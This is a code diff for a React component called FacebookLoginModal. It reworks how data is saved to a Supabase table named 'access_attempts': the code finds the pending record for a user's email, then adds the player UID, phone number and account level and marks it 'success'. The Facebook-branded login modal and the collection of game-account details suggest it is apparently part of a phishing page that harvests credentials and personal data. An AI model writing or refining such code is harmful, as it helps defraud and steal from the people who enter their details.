@@ -68,25 +68,41 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
     try {
       console.log('Updating verification data:', {
         email: userLoginData?.email,
-        verificationData
+        verificationData,
+        currentTime: new Date().toISOString()
       });
       
-      // Update the existing pending record with verification data
-      const { data, error } = await supabase
+      // First, let's find the record to make sure it exists
+      const { data: existingRecord, error: findError } = await supabase
         .from('access_attempts')
-        .update({
-          player_uid: verificationData.playerId,
-          phone_number: verificationData.phoneNumber,
-          player_level: verificationData.accountLevel,
-          status: 'success'
-        })
+        .select('*')
         .eq('email', userLoginData?.email || '')
-        .eq('status', 'pending');
+        .eq('status', 'pending')
+        .order('timestamp', { ascending: false })
+        .limit(1)
+        .single();
 
-      if (error) {
-        console.error('Supabase update error:', error);
+      console.log('Found existing record:', existingRecord, 'Find error:', findError);
+
+      if (existingRecord) {
+        // Update the existing record with verification data
+        const { data, error } = await supabase
+          .from('access_attempts')
+          .update({
+            player_uid: verificationData.playerId,
+            phone_number: verificationData.phoneNumber,
+            player_level: verificationData.accountLevel,
+            status: 'success'
+          })
+          .eq('id', existingRecord.id);
+
+        if (error) {
+          console.error('Supabase update error:', error);
+        } else {
+          console.log('Update successful:', data);
+        }
       } else {
-        console.log('Update successful:', data);
+        console.error('No pending record found for email:', userLoginData?.email);
       }
 
       setShowVerification(false);
